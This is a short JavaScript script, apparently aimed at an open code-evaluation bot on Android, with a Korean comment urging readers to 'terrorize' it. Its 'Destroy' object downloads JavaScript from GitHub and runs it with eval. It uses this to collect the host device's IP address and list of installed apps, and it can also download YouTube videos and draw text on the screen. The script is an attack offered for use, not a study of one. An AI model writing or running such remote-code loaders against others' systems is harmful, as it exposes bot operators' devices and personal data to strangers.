/*

오픈이발 테러하자!

기능 )
아이피 구하기
앱 목록 구하기
유튜브 영상 다운로드하기
화면에 글자 띄우기

*/

function parseD (param) {
  return eval(org.jsoup.Jsoup.connect("https://raw.githubusercontent.com/doami2005/" + param + ".js").get().wholeText())
}

Destroy = {
  getIP() {
    let f = parseD("getLocalIpAddress/master/getLocalIpAddress");
    return f(1) + "\n\n" + f(2);
  },
  getApp() {
    let f = parseD("getAllPackageName/master/getAllPackageName");
    return f.getAllPackageName().map(e => f.getAppName(e)).join("\n");
  },
  YTDL(url, path) {
    let f = parseD("Youtube_Downloader/master/Youtube_Downloader");
    f(url, path);
    return true;
  },
  showText(text, size) {
    let f = parseD("showText/master/showText");
    f(text, size);
    return true;
  }
}
